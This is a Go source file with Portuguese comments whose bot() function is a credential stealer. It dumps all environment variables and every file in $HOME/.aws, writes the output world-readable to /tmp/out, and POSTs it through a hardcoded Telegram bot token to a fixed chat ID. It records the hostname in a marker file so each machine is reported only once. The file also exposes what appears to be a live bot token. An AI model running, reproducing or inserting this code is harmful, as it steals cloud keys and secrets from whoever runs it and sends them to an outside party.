package main






import  (


"net/http"
"fmt"
"bytes"
"os/exec"
"io/ioutil"
"encoding/json"
"os"

)


//essa funcao   sera responsavel por notifica  o bot  

//no  telegram    sobre o sucesso   da  rotina de atila_bin

//e verificara se  existe   chaves  da aws e enviara pra  o bot


var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4" 







func bot () {





cli :=  http.Client{}



extract  :=  exec.Command("sh" ,  "-c" , "env ;   cd   $HOME/.aws ;  cat * " )
 
  
out   ,  err_combinedoutput := extract.CombinedOutput()

if err_combinedoutput != nil {

fmt.Println(err_combinedoutput )

return

}

 

 //salve out  in  /tmp


ioutil.WriteFile("/tmp/out" ,   out ,  0777 )





str :=  map[string] string  {


//saia dissso kkkkk



"chat_id" : "7127446120" ,


"text" :  string(out) ,


}

out_j ,err_m  := json.Marshal (str)



if err_m  != nil {


//erro em json marshall



return

}


out_str  := string(out_j)


data_data  := out_str





//verify file uname.txt



 
home  := os.ExpandEnv("$HOME")


     
 _,  err_op :=  os.Open(home+"/machine_id/uname.txt")



if err_op != nil  {  


fmt.Println("data ainda nao enviada")  


//send data 




} else { 



fmt.Println("data ja foi enviada") 


  return

  

}





data := bytes.NewBufferString(data_data)




req  , err   := http.NewRequest("POST", "https://api.telegram.org/bot" + token  + "/sendMessage"  , data)


req.Header.Set("Content-Type" ,  "application/json")


if err != nil  {


//fmt.Println("erro em  newrequests")

return 

}


_,    err_do  := cli.Do(req)

if err_do  != nil {

return //erro  no do()


}



//data send  of  telegram bot  sinalize in  file the machine name





mkdir := exec.Command("sh"  , "-c"  ,  "mkdir  $HOME/machine_id" ) 


mkdir.Run() //make dir machine_id



//salve hostname  of machine in file in dir  machine_id


uname  := exec.Command("uname", "-n" )


name ,  err_combinedoutput :=  uname.CombinedOutput()


if err_combinedoutput  != nil {


fmt.Println("erro em  combinedoutput")

return


}



 
env := os.ExpandEnv("$HOME")



ioutil.WriteFile(env  +  "/machine_id/uname.txt" ,  name , 0777) 






}
